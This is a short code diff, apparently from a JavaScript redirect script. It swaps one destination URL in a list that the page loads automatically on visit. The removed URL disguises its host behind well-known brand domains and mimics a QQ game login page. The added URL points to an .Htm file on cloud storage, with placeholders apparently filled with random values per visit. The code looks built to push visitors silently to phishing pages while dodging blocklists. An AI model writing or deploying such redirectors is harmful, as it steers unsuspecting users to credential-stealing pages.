@@ -1,5 +1,5 @@
 var urls=[
-' http://resource.edc.org.cn./user/https://jd.com/https://taobao.com/https://www.qq.com/url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html/171671229221.htm#{nnnnnnn}{wwww}',
+' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/941694a297aa4dbd8ee190bb06aae026.Htm#{nnnnnnn}{wwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
